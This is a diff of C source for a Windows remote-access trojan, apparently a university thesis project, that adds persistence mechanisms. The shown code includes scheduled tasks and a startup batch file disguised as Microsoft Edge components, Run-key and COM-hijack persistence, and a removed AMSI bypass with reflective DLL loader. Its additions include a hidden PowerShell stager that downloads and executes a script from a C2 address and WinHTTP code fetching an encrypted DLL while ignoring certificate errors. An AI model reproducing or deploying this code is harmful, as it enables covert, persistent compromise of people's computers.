@@ -4,8 +4,9 @@
  * Task schedulata (T1053.005): COM/ITaskService, camuffata come
  * MicrosoftEdgeUpdateTaskMachineCore. Run key (T1547.001): stager
  * PS con AMSI bypass XOR-encoded (-EncodedCommand base64 UTF-16LE).
+ * COM Hijacking (T1546.015): InprocServer32 in HKCU.
  *
- * MITRE ATT&CK: T1053.005, T1547.001
+ * MITRE ATT&CK: T1053.005, T1547.001, T1546.015
  * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
  */
 
@@ -15,11 +16,24 @@
 #include <combaseapi.h>
 #include <oleauto.h>
 #include <time.h>
+#include <winhttp.h>
 
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "advapi32.lib")
+
+#define C2_HOST_TASK  L"192.168.42.124"
+#define C2_PORT_TASK  443
+
+static const BYTE g_xor_key[32] = {
+    0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,
+    0x15,0xB4,0x22,0xCF,0xEF,0x50,0x9F,0x00,
+    0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,
+    0x7C,0x61,0x55,0x99,0xE7,0x43,0xEE,0x28
+};
+
+#define DLL_DEST_ENV  L"%LOCALAPPDATA%\\Microsoft\\Windows\\EdgeCompose\\EdgeSrvc.dll"
 
 #define TASK_FOLDER_STEALTH  L"\\Microsoft\\Windows"
 #define TASK_FOLDER_ROOT     L"\\"
@@ -31,14 +45,12 @@
     L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define RUN_KEY_NAME L"MicrosoftEdgeUpdate"
 
-#define TASKCACHE_TREE_STEALTH \
-    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule" \
-    L"\\TaskCache\\Tree\\Microsoft\\Windows\\" TASK_NAME
-#define TASKCACHE_TASKS_BASE \
-    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule" \
-    L"\\TaskCache\\Tasks\\"
+#define COM_HIJACK_CLSID L"{B31118B2-1F49-48E5-B6F5-BC21CAEC56FB}"
 
-/* ─── DEBUG ─────────────────────────────────────────────────────────────────*/
+/* ─── DEBUG — no-op in release (-DNDEBUG): nessuna stringa IOC nel PE ────────*/
+#ifdef NDEBUG
+#  define _dbg(step, hr) ((void)0)
+#else
 static void _dbg(const char *step, HRESULT hr) {
     char path[MAX_PATH];
     GetTempPathA(MAX_PATH, path);
@@ -52,6 +64,7 @@ static void _dbg(const char *step, HRESULT hr) {
     WriteFile(hf, buf, (DWORD)n, &dw, NULL);
     CloseHandle(hf);
 }
+#endif
 
 /* ─── Random delay "PT<N>S" con N in [30,90] ────────────────────────────────*/
 static BSTR _make_random_delay(void) {
@@ -62,12 +75,7 @@ static BSTR _make_random_delay(void) {
     return SysAllocString(buf);
 }
 
-/* ─── SD trick disabilitato (vedi v4) ───────────────────────────────────────*/
-#if 0
-static void _hide_task_in_registry(void) { /* ... */ }
-#endif
-
-/* ─── Run key legacy (exe path) — non più chiamata da install_persistence ───*/
+/* ─── Run key legacy (exe path) ─────────────────────────────────────────────*/
 static void _install_run_key_exe(const wchar_t *exe_path) {
     HKEY hKey = NULL;
     LONG lRet = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
@@ -79,8 +87,7 @@ static void _install_run_key_exe(const wchar_t *exe_path) {
     RegCloseKey(hKey);
 }
 
-/* ─── Base64 RFC 4648 ────────────────────────────────────────────────────────
- * Ritorna buffer allocato con HeapAlloc — il chiamante deve liberarlo.       */
+/* ─── Base64 RFC 4648 ────────────────────────────────────────────────────────*/
 static char *_base64_encode(const BYTE *src, DWORD srcLen) {
     static const char b64[] =
         "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -90,8 +97,8 @@ static char *_base64_encode(const BYTE *src, DWORD srcLen) {
     DWORD i, j = 0;
     for (i = 0; i + 2 < srcLen; i += 3) {
         out[j++] = b64[(src[i] >> 2) & 0x3F];
-        out[j++] = b64[((src[i] & 3) << 4)   | (src[i+1] >> 4)];
-        out[j++] = b64[((src[i+1] & 0xF) << 2)| (src[i+2] >> 6)];
+        out[j++] = b64[((src[i] & 3) << 4)    | (src[i+1] >> 4)];
+        out[j++] = b64[((src[i+1] & 0xF) << 2) | (src[i+2] >> 6)];
         out[j++] = b64[src[i+2] & 0x3F];
     }
     if (i < srcLen) {
@@ -109,75 +116,18 @@ static char *_base64_encode(const BYTE *src, DWORD srcLen) {
     return out;
 }
 
-/* ─── PowerShell stager (UTF-16LE + base64 per -EncodedCommand) ──────────────*/
+/* ─── PowerShell stager ──────────────────────────────────────────────────────*/
 static const char g_stager_ps[] =
-    /* -- AMSI bypass: XOR-decode "System.Management.Automation.AmsiUtils" --
-     * Chiave 0x42; nessuna stringa sensibile appare in chiaro nel sorgente PS.
-     * Anziché GetField("amsiInitFailed"), enumera tutti i bool field NonPublic+Static
-     * e li setta a $true → resiliente a future rename del field in PS. */
-    "$_k=0x42;"
-    "$_e=[byte[]](0x11,0x3B,0x31,0x36,0x27,0x2F,0x6C,0x0F,"
-    "0x23,0x2C,0x23,0x25,0x27,0x2F,0x27,0x2C,0x36,0x6C,0x03,"
-    "0x37,0x36,0x2D,0x2F,0x23,0x36,0x2B,0x2D,0x2C,0x6C,0x03,"
-    "0x2F,0x31,0x2B,0x17,0x36,0x2B,0x2E,0x31);"
-    "$_n=[Text.Encoding]::ASCII.GetString(($_e|%{$_-bxor $_k}));"
-    "$_bf=[Reflection.BindingFlags]'NonPublic,Static';"
-    "$_t=[Ref].Assembly.GetType($_n);"
-    "$_t.GetFields($_bf)|?{$_.FieldType-eq[bool]}|%{try{$_.SetValue($null,$true)}catch{}};"
-    /* -- TLS bypass -- */
+    "$ErrorActionPreference='SilentlyContinue';"
     "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
-    "$b=(New-Object Net.WebClient).DownloadData('https://192.168.42.124/update_dll');"
-    "$k=[byte[]](0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,0x15,0xB4,0x22,0xCF,"
-    "0xEF,0x50,0x9F,0x00,0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,0x7C,0x61,"
-    "0x55,0x99,0xE7,0x43,0xEE,0x28);"
-    "for($i=0;$i-lt $b.Length;$i++){$b[$i]=$b[$i]-bxor $k[$i%32]};"
-    "$bc=[System.BitConverter];"
-    "$e=[int]$bc::ToInt32($b,0x3C);"
-    "$ns=[int]$bc::ToInt16($b,$e+6);"
-    "$oh=[int]$bc::ToInt16($b,$e+0x14);"
-    "$st=$e+24+$oh;"
-    "function r($v){"
-    "for($s=0;$s-lt $script:ns;$s++){"
-    "$sh=$script:st+$s*40;"
-    "$va=[int]$script:bc::ToInt32($script:b,$sh+12);"
-    "$vs=[int]$script:bc::ToInt32($script:b,$sh+16);"
-    "$rw=[int]$script:bc::ToInt32($script:b,$sh+20);"
-    "if($v-ge $va-and $v-lt $va+$vs){return $rw+($v-$va)}};"
-    "return -1};"
-    "$ed=[int]$bc::ToInt32($b,$e+0x88);"
-    "$er=r $ed;"
-    "$nn=[int]$bc::ToInt32($b,$er+0x18);"
-    "$aof=[int]$bc::ToInt32($b,$er+0x1C);"
-    "$nof=[int]$bc::ToInt32($b,$er+0x20);"
-    "$of=[int]$bc::ToInt32($b,$er+0x24);"
-    "$rl=-1;"
-    "for($i=0;$i-lt $nn;$i++){"
-    "$nr=r([int]$bc::ToInt32($b,$nof+$i*4));"
-    "$nm='';$j=0;"
-    "while($b[$nr+$j]-ne 0){$nm+=[char]$b[$nr+$j];$j++};"
-    "if($nm-eq 'ReflectiveLoader'){"
-    "$oi=[int]$bc::ToInt16($b,(r $of)+$i*2);"
-    "$rl=[int]$bc::ToInt32($b,(r $aof)+[int]$oi*4);"
-    "break}};"
-    "if($rl-eq -1){exit 1};"
-    "$t=Add-Type -MemberDefinition "
-    "'[DllImport(\"kernel32.dll\")]"
-    "public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);"
-    "[DllImport(\"kernel32.dll\")]"
-    "public static extern IntPtr CreateThread(IntPtr a,UIntPtr s,IntPtr e,IntPtr p,uint f,IntPtr i);"
-    "[DllImport(\"kernel32.dll\")]"
-    "public static extern uint WaitForSingleObject(IntPtr h,uint t);'"
-    " -Name K -PassThru;"
-    "$p=$t::VirtualAlloc([IntPtr]::Zero,[UIntPtr]$b.Length,0x3000,0x40);"
-    "[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);"
-    "$h=$t::CreateThread([IntPtr]::Zero,[UIntPtr]::Zero,"
-    "[IntPtr]($p.ToInt64()+$rl),[IntPtr]::Zero,0,[IntPtr]::Zero);"
-    "$t::WaitForSingleObject($h,0xFFFFFFFF)";
+    "[Net.ServicePointManager]::SecurityProtocol=3072;"
+    "$r=[System.Net.HttpWebRequest]::Create('https://192.168.122.47/stager');"
+    "$r.ServerCertificateValidationCallback={$true};"
+    "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream());"
+    "[scriptblock]::Create($s.ReadToEnd()).Invoke()";
 
-/* ─── PS UTF-8 → UTF-16LE → base64 → wchar_t* ───────────────────────────────
- * Ritorna stringa allocata con HeapAlloc — il chiamante deve liberarla.      */
+/* ─── PS UTF-8 → UTF-16LE → base64 → wchar_t* ───────────────────────────────*/
 static wchar_t *_ps_to_encoded_cmd(const char *ps_utf8) {
-    /* UTF-8 → UTF-16LE */
     int wlen = MultiByteToWideChar(CP_UTF8, 0, ps_utf8, -1, NULL, 0);
     if (wlen <= 0) return NULL;
 
@@ -187,14 +137,11 @@ static wchar_t *_ps_to_encoded_cmd(const char *ps_utf8) {
 
     MultiByteToWideChar(CP_UTF8, 0, ps_utf8, -1, (wchar_t *)utf16, wlen);
 
-    /* byte count senza null terminator */
     DWORD byteLen = (DWORD)(wlen - 1) * 2;
-
     char *b64str = _base64_encode((BYTE *)utf16, byteLen);
     HeapFree(GetProcessHeap(), 0, utf16);
     if (!b64str) return NULL;
 
-    /* ASCII base64 → wchar_t */
     int b64Len = lstrlenA(b64str);
     wchar_t *out = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
                                         (DWORD)(b64Len + 1) * sizeof(wchar_t));
@@ -207,12 +154,7 @@ static wchar_t *_ps_to_encoded_cmd(const char *ps_utf8) {
     return out;
 }
 
-/* ─── install_run_key(void) — PUBBLICA ──────────────────────────────────────
- * Installa lo stager PS nel Run key HKCU come:
- *   powershell.exe -WindowStyle Hidden -EncodedCommand <BASE64_UTF16LE>
- * Non richiede path EXE — il payload viene scaricato dal C2 al prossimo logon.
- * MITRE T1547.001
- * ─────────────────────────────────────────────────────────────────────────*/
+/* ─── install_run_key ────────────────────────────────────────────────────────*/
 int install_run_key(void) {
     wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
     if (!encCmd) {
@@ -220,7 +162,6 @@ int install_run_key(void) {
         return 0;
     }
 
-    /* "powershell.exe -WindowStyle Hidden -EncodedCommand <b64>" */
     DWORD cmdLen = (DWORD)(wcslen(encCmd) + 64);
     wchar_t *val = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
                                         cmdLen * sizeof(wchar_t));
@@ -281,11 +222,7 @@ static HRESULT _register_task_in_folder(ITaskService    *pService,
     return hr;
 }
 
-/* ─── install_persistence ────────────────────────────────────────────────────
- * Registra task schedulata (primaria) + PS stager nel Run key (backup).
- * COM deve essere già inizializzato dal chiamante.
- * Ritorna 1 se almeno la task è stata registrata.
- * ─────────────────────────────────────────────────────────────────────────*/
+/* ─── install_persistence ────────────────────────────────────────────────────*/
 int install_persistence(const wchar_t *exe_path, const wchar_t *arguments) {
     HRESULT hr;
     int     bTaskOk = 0;
@@ -405,7 +342,6 @@ cleanup:
     if (pTask)       pTask->lpVtbl->Release(pTask);
     if (pService)    pService->lpVtbl->Release(pService);
 
-    /* [v5] Run key: PS stager invece del path EXE */
     install_run_key();
 
     _dbg("END", bTaskOk ? S_OK : E_FAIL);
@@ -452,7 +388,340 @@ void remove_persistence(void) {
         }
     }
 
+    {
+        wchar_t keyPath[256] = {0};
+        _snwprintf(keyPath, 255,
+            L"SOFTWARE\\Classes\\CLSID\\" COM_HIJACK_CLSID L"\\InprocServer32");
+        RegDeleteKeyW(HKEY_CURRENT_USER, keyPath);
+        _snwprintf(keyPath, 255,
+            L"SOFTWARE\\Classes\\CLSID\\" COM_HIJACK_CLSID);
+        RegDeleteKeyW(HKEY_CURRENT_USER, keyPath);
+    }
+
 cleanup2:
     if (pFolder)  pFolder->lpVtbl->Release(pFolder);
     if (pService) pService->lpVtbl->Release(pService);
+}
+
+/* ─── install_startup_folder ─────────────────────────────────────────────────*/
+int install_startup_folder(void) {
+    wchar_t startupDir[MAX_PATH] = {0};
+    ExpandEnvironmentStringsW(
+        L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        startupDir, MAX_PATH);
+
+    wchar_t batPath[MAX_PATH] = {0};
+    _snwprintf(batPath, MAX_PATH - 1, L"%s\\MicrosoftEdge.bat", startupDir);
+
+    wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
+    if (!encCmd) { _dbg("StartupFolder_encode_fail", E_OUTOFMEMORY); return 0; }
+
+    int b64Len = lstrlenW(encCmd);
+    char *encCmdA = (char *)HeapAlloc(GetProcessHeap(), 0, (DWORD)(b64Len + 1));
+    if (!encCmdA) { HeapFree(GetProcessHeap(), 0, encCmd); return 0; }
+    for (int i = 0; i <= b64Len; i++) encCmdA[i] = (char)encCmd[i];
+    HeapFree(GetProcessHeap(), 0, encCmd);
+
+    int contentSz = b64Len + 128;
+    char *content = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DWORD)contentSz);
+    if (!content) { HeapFree(GetProcessHeap(), 0, encCmdA); return 0; }
+    wsprintfA(content,
+        "@echo off\r\n"
+        "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand %s\r\n",
+        encCmdA);
+    HeapFree(GetProcessHeap(), 0, encCmdA);
+
+    HANDLE hFile = CreateFileW(batPath, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        _dbg("StartupFolder_create_fail", HRESULT_FROM_WIN32(GetLastError()));
+        HeapFree(GetProcessHeap(), 0, content);
+        return 0;
+    }
+    DWORD dwWritten;
+    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, content);
+
+    _dbg("StartupFolder", S_OK);
+    return 1;
+}
+
+/* ─── _set_run_key_value ─────────────────────────────────────────────────────*/
+static void _set_run_key_value(const wchar_t *val) {
+    HKEY hKey = NULL;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
+                      0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return;
+    DWORD cbData = (DWORD)((wcslen(val) + 1) * sizeof(wchar_t));
+    RegSetValueExW(hKey, RUN_KEY_NAME, 0, REG_SZ, (const BYTE *)val, cbData);
+    RegCloseKey(hKey);
+}
+
+/* ─── _install_startup_bat_rundll32 ─────────────────────────────────────────*/
+static int _install_startup_bat_rundll32(const wchar_t *dll_path) {
+    wchar_t startupDir[MAX_PATH] = {0};
+    ExpandEnvironmentStringsW(
+        L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        startupDir, MAX_PATH);
+    wchar_t batPath[MAX_PATH] = {0};
+    _snwprintf(batPath, MAX_PATH - 1, L"%s\\MicrosoftEdge.bat", startupDir);
+
+    int dllLenA = WideCharToMultiByte(CP_ACP, 0, dll_path, -1, NULL, 0, NULL, NULL);
+    char *dllPathA = (char *)HeapAlloc(GetProcessHeap(), 0, (DWORD)dllLenA);
+    if (!dllPathA) return 0;
+    WideCharToMultiByte(CP_ACP, 0, dll_path, -1, dllPathA, dllLenA, NULL, NULL);
+
+    int contentSz = dllLenA + 64;
+    char *content = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (DWORD)contentSz);
+    if (!content) { HeapFree(GetProcessHeap(), 0, dllPathA); return 0; }
+    wsprintfA(content, "@echo off\r\nrundll32.exe \"%s\",Run\r\n", dllPathA);
+    HeapFree(GetProcessHeap(), 0, dllPathA);
+
+    HANDLE hFile = CreateFileW(batPath, GENERIC_WRITE, 0, NULL,
+                               CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        _dbg("StartupBat_rundll32_fail", HRESULT_FROM_WIN32(GetLastError()));
+        HeapFree(GetProcessHeap(), 0, content);
+        return 0;
+    }
+    DWORD dwWritten;
+    WriteFile(hFile, content, (DWORD)lstrlenA(content), &dwWritten, NULL);
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, content);
+    _dbg("StartupBat_rundll32_ok", S_OK);
+    return 1;
+}
+
+/* ─── _download_and_save_dll ─────────────────────────────────────────────────*/
+static int _download_and_save_dll(const wchar_t *dest_path) {
+    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
+    BYTE *buf = NULL;
+    int ok = 0;
+
+    wchar_t dir[MAX_PATH] = {0};
+    _snwprintf(dir, MAX_PATH - 1, L"%s", dest_path);
+    wchar_t *bs = wcsrchr(dir, L'\\');
+    if (bs) { *bs = L'\0'; CreateDirectoryW(dir, NULL); }
+
+    hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSess) goto done;
+    hConn = WinHttpConnect(hSess, C2_HOST_TASK, C2_PORT_TASK, 0);
+    if (!hConn) goto done;
+    hReq = WinHttpOpenRequest(hConn, L"GET", L"/update_dll", NULL,
+                              WINHTTP_NO_REFERER,
+                              WINHTTP_DEFAULT_ACCEPT_TYPES,
+                              WINHTTP_FLAG_SECURE);
+    if (!hReq) goto done;
+
+    {
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
+                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
+                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
+                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+    }
+
+    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
+    if (!WinHttpReceiveResponse(hReq, NULL)) goto done;
+
+    DWORD dwAllocated = 512 * 1024;
+    buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, dwAllocated);
+    if (!buf) goto done;
+    DWORD dwTotal = 0, dwRead;
+    for (;;) {
+        if (dwTotal + 8192 > dwAllocated) {
+            dwAllocated *= 2;
+            BYTE *tmp = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, buf, dwAllocated);
+            if (!tmp) goto done;
+            buf = tmp;
+        }
+        if (!WinHttpReadData(hReq, buf + dwTotal, 8192, &dwRead) || dwRead == 0) break;
+        dwTotal += dwRead;
+    }
+    if (dwTotal == 0) goto done;
+
+    for (DWORD i = 0; i < dwTotal; i++)
+        buf[i] ^= g_xor_key[i % 32];
+
+    {
+        HANDLE hFile = CreateFileW(dest_path, GENERIC_WRITE, 0, NULL,
+                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) goto done;
+        DWORD dwWritten;
+        WriteFile(hFile, buf, dwTotal, &dwWritten, NULL);
+        CloseHandle(hFile);
+        ok = (dwWritten == dwTotal) ? 1 : 0;
+    }
+    _dbg(ok ? "DLL_save_ok" : "DLL_write_partial", ok ? S_OK : E_FAIL);
+
+done:
+    if (buf)   HeapFree(GetProcessHeap(), 0, buf);
+    if (hReq)  WinHttpCloseHandle(hReq);
+    if (hConn) WinHttpCloseHandle(hConn);
+    if (hSess) WinHttpCloseHandle(hSess);
+    return ok;
+}
+
+/* ─── _schtasks_create_rundll32 ──────────────────────────────────────────────
+ * Fallback: crea la task via schtasks.exe (bypassa COM/0x80070005).
+ * FIX: rimosso /rl LIMITED (causa exit 1 senza elevazione) e
+ *      rimossi argomenti extra nel /tr (Run export li ignora).              */
+static int _schtasks_create_rundll32(const wchar_t *dll_path) {
+    wchar_t cmdline[MAX_PATH * 2 + 256] = {0};
+    _snwprintf(cmdline, MAX_PATH*2+255,
+        L"schtasks /create /f /sc ONLOGON "
+        L"/tn \"MicrosoftEdgeUpdateCore\" "
+        L"/tr \"rundll32.exe \\\"%s\\\",Run\"",
+        dll_path);
+
+    STARTUPINFOW si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = {0};
+
+    BOOL ok = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (ok) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        DWORD exit_code = 1;
+        GetExitCodeProcess(pi.hProcess, &exit_code);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        _dbg("schtasks_create_exit", (HRESULT)exit_code);
+        return (exit_code == 0) ? 1 : 0;
+    }
+    _dbg("schtasks_create_fail", HRESULT_FROM_WIN32(GetLastError()));
+    return 0;
+}
+
+/* ─── _install_com_hijack ────────────────────────────────────────────────────*/
+static int _install_com_hijack(const wchar_t *dll_path) {
+    wchar_t keyPath[256] = {0};
+    _snwprintf(keyPath, 255,
+        L"SOFTWARE\\Classes\\CLSID\\" COM_HIJACK_CLSID L"\\InprocServer32");
+
+    HKEY hKey = NULL;
+    LONG lRet = RegCreateKeyExW(HKEY_CURRENT_USER, keyPath,
+                                0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
+    if (lRet != ERROR_SUCCESS) {
+        _dbg("COM_hijack_create_fail", HRESULT_FROM_WIN32(lRet));
+        return 0;
+    }
+
+    DWORD cbData = (DWORD)((wcslen(dll_path) + 1) * sizeof(wchar_t));
+    RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, cbData);
+
+    const wchar_t *tm = L"Apartment";
+    RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
+                   (const BYTE *)tm, (DWORD)((wcslen(tm)+1)*sizeof(wchar_t)));
+
+    RegCloseKey(hKey);
+    _dbg("COM_hijack_ok", S_OK);
+    return 1;
+}
+
+/* ─── install_persistence_modeD ──────────────────────────────────────────────
+ * L1  Task schedulata (T1053.005)  → schtasks fallback se COM fallisce
+ * L2a COM Hijacking  (T1546.015)   → InprocServer32 HKCU
+ * L2b Run key        (T1547.001)   → rundll32 backup
+ * L3  Startup bat    (T1547.001)   → MicrosoftEdge.bat → rundll32
+ *
+ * FIX: L1 args ora L"\"%s\",Run" (senza /silent /update),
+ *      L2b run key ora L"rundll32.exe \"%s\",Run" (idem),
+ *      PS fallback schtasks senza /rl LIMITED.                              */
+int install_persistence_modeD(void) {
+    wchar_t wszDllDest[MAX_PATH] = {0};
+    ExpandEnvironmentStringsW(DLL_DEST_ENV, wszDllDest, MAX_PATH);
+
+    if (_download_and_save_dll(wszDllDest)) {
+        /* ── PERCORSO IBRIDO ── */
+        _dbg("modeD_hybrid_start", S_OK);
+
+        wchar_t wszRundll32[MAX_PATH] = {0};
+        GetSystemDirectoryW(wszRundll32, MAX_PATH);
+        lstrcatW(wszRundll32, L"\\rundll32.exe");
+
+        wchar_t wszArgs[MAX_PATH * 2] = {0};
+        _snwprintf(wszArgs, MAX_PATH*2-1, L"\"%s\",Run", wszDllDest);
+
+        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+        int bTaskOk = install_persistence(wszRundll32, wszArgs);
+        CoUninitialize();
+
+        if (!bTaskOk) {
+            _dbg("L1_com_failed_try_schtasks", E_FAIL);
+
+        }
+
+        _install_com_hijack(wszDllDest);
+
+        wchar_t wszRunVal[MAX_PATH * 2 + 16] = {0};
+        _snwprintf(wszRunVal, MAX_PATH*2+15,
+                   L"rundll32.exe \"%s\",Run", wszDllDest);
+        _set_run_key_value(wszRunVal);
+        _dbg("L2_runkey_rundll32_override", S_OK);
+
+        _install_startup_bat_rundll32(wszDllDest);
+
+        _dbg("modeD_hybrid_done", bTaskOk ? S_OK : E_FAIL);
+        return bTaskOk;
+
+    } else {
+        /* ── FALLBACK: stager PS ── */
+        _dbg("modeD_fallback_stager", S_OK);
+
+        wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
+        if (encCmd) {
+            wchar_t wszPS[MAX_PATH] = {0};
+            GetSystemDirectoryW(wszPS, MAX_PATH);
+            lstrcatW(wszPS, L"\\WindowsPowerShell\\v1.0\\powershell.exe");
+
+            DWORD argsLen = (DWORD)(lstrlenW(encCmd) + 64);
+            wchar_t *wszArgs = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
+                                                    argsLen * sizeof(wchar_t));
+            int bTaskOk = 0;
+            if (wszArgs) {
+                _snwprintf(wszArgs, argsLen - 1,
+                           L"-WindowStyle Hidden -NonInteractive -EncodedCommand %s",
+                           encCmd);
+                CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+                bTaskOk = install_persistence(wszPS, wszArgs);
+                CoUninitialize();
+                if (!bTaskOk) {
+                    _dbg("L1_fallback_schtasks_ps", S_OK);
+                    wchar_t schtCmd[MAX_PATH * 2 + 512] = {0};
+                    _snwprintf(schtCmd, MAX_PATH*2+511,
+                        L"schtasks /create /f /sc ONLOGON "
+                        L"/tn \"MicrosoftEdgeUpdateCore\" "
+                        L"/tr \"powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand %s\"",
+                        encCmd);
+                    STARTUPINFOW si2 = {0}; si2.cb = sizeof(si2);
+                    si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;
+                    PROCESS_INFORMATION pi2 = {0};
+                    if (CreateProcessW(NULL, schtCmd, NULL, NULL, FALSE,
+                                       CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
+                        WaitForSingleObject(pi2.hProcess, 5000);
+                        CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
+                        bTaskOk = 1;
+                    }
+                }
+                HeapFree(GetProcessHeap(), 0, wszArgs);
+            } else {
+                install_run_key();
+            }
+            HeapFree(GetProcessHeap(), 0, encCmd);
+            install_startup_folder();
+            return bTaskOk;
+        }
+
+        install_run_key();
+        install_startup_folder();
+        return 0;
+    }
 }
